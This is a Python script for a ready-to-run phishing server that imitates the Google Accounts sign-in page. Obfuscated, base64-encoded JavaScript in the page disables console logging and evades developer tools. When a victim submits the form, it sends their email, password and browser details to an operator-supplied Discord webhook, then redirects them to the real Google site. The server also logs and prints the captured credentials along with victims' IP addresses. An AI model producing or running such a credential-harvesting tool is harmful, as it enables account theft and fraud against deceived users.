import http.server
import socketserver
import threading
import requests
import sys
import time
import base64
import json

class GooglePhishingGenerator:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
    
    def generate_html(self):
        js_code = self.generate_javascript()
        js_encoded = base64.b64encode(js_code.encode()).decode()
        
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in – Google Accounts</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png" type="image/png">
    <style>
        body {{
            margin:0;
            padding:0;
            height:100vh;
            background:#fff;
            font-family:'Google Sans',Roboto,Arial,sans-serif;
            color:#202124;
            display:flex;
            justify-content:center;
            align-items:center;
        }}
        .container {{
            width:100%;
            max-width:450px;
            padding:20px;
        }}
        .login-card {{
            background:#fff;
            border:1px solid #dadce0;
            border-radius:8px;
            padding:48px 40px 36px;
        }}
        .google-logo {{
            width:75px;
            height:24px;
            display:block;
            margin:0 auto 20px;
        }}
        .title {{
            font-size:24px;
            font-weight:400;
            text-align:center;
            margin-bottom:10px;
        }}
        .subtitle {{
            font-size:16px;
            color:#5f6368;
            text-align:center;
            margin-bottom:30px;
        }}
        .input-group {{
            margin-bottom:20px;
        }}
        .input-label {{
            display:block;
            font-size:14px;
            color:#5f6368;
            margin-bottom:5px;
        }}
        .input-field {{
            width:100%;
            padding:13px 15px;
            font-size:16px;
            border:1px solid #dadce0;
            border-radius:4px;
            box-sizing:border-box;
        }}
        .input-field:focus {{
            border-color:#1a73e8;
            outline:none;
        }}
        .forgot-link {{
            color:#1a73e8;
            text-decoration:none;
            font-size:14px;
            float:right;
            margin-top:10px;
        }}
        .submit-btn {{
            width:100%;
            background:#1a73e8;
            color:#fff;
            border:none;
            border-radius:4px;
            padding:12px 24px;
            font-size:16px;
            font-weight:500;
            cursor:pointer;
            margin-top:30px;
        }}
        .submit-btn:hover {{
            background:#1669c1;
        }}
        .footer {{
            margin-top:30px;
            text-align:center;
            color:#5f6368;
            font-size:14px;
        }}
        .footer-links {{
            margin-top:20px;
            display:flex;
            justify-content:center;
            gap:20px;
        }}
        .footer-links a {{
            color:#5f6368;
            text-decoration:none;
            font-size:12px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
            <h1 class="title">Sign in</h1>
            <p class="subtitle">Use your Google Account</p>
            
            <form method="POST" action="/submit" id="loginForm">
                <div class="input-group">
                    <label class="input-label" for="email">Email or phone</label>
                    <input class="input-field" id="email" name="email" type="email" required autofocus>
                </div>
                
                <div class="input-group">
                    <label class="input-label" for="password">Enter your password</label>
                    <input class="input-field" id="password" name="password" type="password" required>
                    <a href="#" class="forgot-link">Forgot password?</a>
                </div>
                
                <button class="submit-btn" type="submit">Next</button>
            </form>
            
            <div class="footer">
                Not your computer? Use Guest mode to sign in privately.
                <div class="footer-links">
                    <a href="#">Help</a>
                    <a href="#">Privacy</a>
                    <a href="#">Terms</a>
                </div>
            </div>
        </div>
    </div>
    <script src="data:text/javascript;base64,{js_encoded}"></script>
</body>
</html>"""
    
    def generate_javascript(self):
        webhook_url = self.webhook_url
        
        return f"""
document.addEventListener('DOMContentLoaded', function() {{
    var form = document.getElementById('loginForm');
    var originalConsole = window.console;
    
    Object.defineProperty(window, 'console', {{
        value: new Proxy(console, {{
            get: function(target, prop) {{
                if (['log', 'error', 'warn', 'info', 'debug'].includes(prop)) {{
                    return function() {{}};
                }}
                return target[prop];
            }}
        }}),
        writable: false,
        configurable: false
    }});
    
    setInterval(function() {{
        var devToolsOpen = false;
        var widthDiff = window.outerWidth - window.innerWidth;
        var heightDiff = window.outerHeight - window.innerHeight;
        
        if (widthDiff > 160 || heightDiff > 160) {{
            devToolsOpen = true;
        }}
        
        if (devToolsOpen) {{
            window.location.href = 'about:blank';
        }}
    }}, 1000);
    
    form.addEventListener('submit', function(e) {{
        e.preventDefault();
        
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
        var timestamp = new Date().toISOString();
        var userAgent = navigator.userAgent;
        var platform = navigator.platform;
        var language = navigator.language;
        
        var payload = {{
            embeds: [{{
                title: "Google Login Capture",
                color: 16711680,
                fields: [
                    {{ name: "Email", value: email, inline: false }},
                    {{ name: "Password", value: password, inline: false }},
                    {{ name: "Timestamp", value: timestamp, inline: false }},
                    {{ name: "User Agent", value: userAgent, inline: false }},
                    {{ name: "Platform", value: platform, inline: false }},
                    {{ name: "Language", value: language, inline: false }}
                ]
            }}]
        }};
        
        fetch('{webhook_url}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(payload)
        }})
        .then(function(response) {{
            window.location.href = "https://accounts.google.com";
        }})
        .catch(function(error) {{
            window.location.href = "https://accounts.google.com";
        }});
    }});
}});
"""

class PhishingServerHandler(http.server.BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.parent = kwargs.pop('server_instance')
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.parent.html_content.encode())
        elif self.path == '/submit':
            self.send_response(302)
            self.send_header('Location', 'https://accounts.google.com')
            self.end_headers()
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'404 Not Found')
    
    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            import urllib.parse
            params = urllib.parse.parse_qs(post_data)
            
            capture_data = {
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'ip_address': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'email': params.get('email', [''])[0],
                'password': params.get('password', [''])[0]
            }
            
            self.parent.captures.append(capture_data)
            
            print(f"[CAPTURE] {capture_data['timestamp']}")
            print(f"  IP: {capture_data['ip_address']}")
            print(f"  Email: {capture_data['email']}")
            print(f"  Password: {capture_data['password']}")
            print("-" * 50)
            
            self.send_response(302)
            self.send_header('Location', 'https://accounts.google.com')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

class PhishingServer:
    def __init__(self, port=8080, webhook_url=""):
        self.port = port
        self.webhook_url = webhook_url
        self.generator = GooglePhishingGenerator(webhook_url)
        self.html_content = self.generator.generate_html()
        self.captures = []
        self.server = None
        self.server_thread = None
    
    def start(self):
        handler = lambda *args, **kwargs: PhishingServerHandler(*args, server_instance=self, **kwargs)
        self.server = socketserver.TCPServer(('0.0.0.0', self.port), handler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()
        
        local_ip = self.get_local_ip()
        print("=" * 70)
        print("PHISHING SERVER STARTED")
        print("=" * 70)
        print(f"Local URL: http://localhost:{self.port}")
        print(f"Network URL: http://{local_ip}:{self.port}")
        print(f"Webhook URL: {self.webhook_url}")
        print("=" * 70)
        print("Server is running... Press Ctrl+C to stop")
        print("=" * 70)
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def show_captures(self):
        if not self.captures:
            print("No captures yet.")
            return
        
        print("\n" + "=" * 70)
        print("CAPTURED DATA")
        print("=" * 70)
        for idx, capture in enumerate(self.captures, 1):
            print(f"[{idx}] {capture['timestamp']}")
            print(f"    IP: {capture['ip_address']}")
            print(f"    Email: {capture['email']}")
            print(f"    Password: {capture['password']}")
            print(f"    User Agent: {capture['user_agent'][:60]}...")
            print()
        print("=" * 70)

def main():
    print("=" * 70)
    print("GOOGLE PHISHING SERVER")
    print("=" * 70)
    print("1. Generate Google phishing page with webhook")
    print("2. Custom HTML phishing page")
    print("3. Exit")
    
    choice = input("Select option [1]: ").strip()
    if choice == "3":
        return
    
    port_input = input("Server port [8080]: ").strip()
    port = 8080
    if port_input:
        try:
            port = int(port_input)
        except:
            port = 8080
    
    webhook_url = input("Discord Webhook URL (required): ").strip()
    if not webhook_url:
        print("Webhook URL is required.")
        return
    
    server = PhishingServer(port=port, webhook_url=webhook_url)
    
    if choice == "2":
        print("\nPaste your HTML code (type 'END' on a new line to finish):")
        lines = []
        while True:
            line = input()
            if line.strip().upper() == "END":
                break
            lines.append(line)
        server.html_content = "\n".join(lines)
    
    try:
        server.start()
        
        import webbrowser
        webbrowser.open(f"http://localhost:{port}")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nServer stopped.")
        server.stop()
        server.show_captures()
    
    except Exception as e:
        print(f"Error: {e}")
        server.stop()

if __name__ == "__main__":
    main()